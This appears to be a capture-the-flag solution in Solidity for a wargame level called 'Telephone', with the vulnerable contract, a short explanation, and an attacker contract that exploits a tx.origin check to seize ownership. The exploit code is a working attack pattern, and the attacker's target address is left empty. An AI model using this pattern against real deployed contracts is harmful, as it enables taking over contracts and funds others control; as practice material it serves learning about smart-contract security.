// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: You will beat this level if you claim ownership of the contract


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}



//SOLUTION
//- to claim ownership the sender must be different than the transaction origin, so we simply create a smart contract that acts
//  as a forwarder of our transaction and call this contract which in return calls the victim contract


contract Attacker {

	Telephone telephone = Telephone(address()); 

	function attack() public {
		
		telephone.changeOwner(msg.sender);
		
	}

}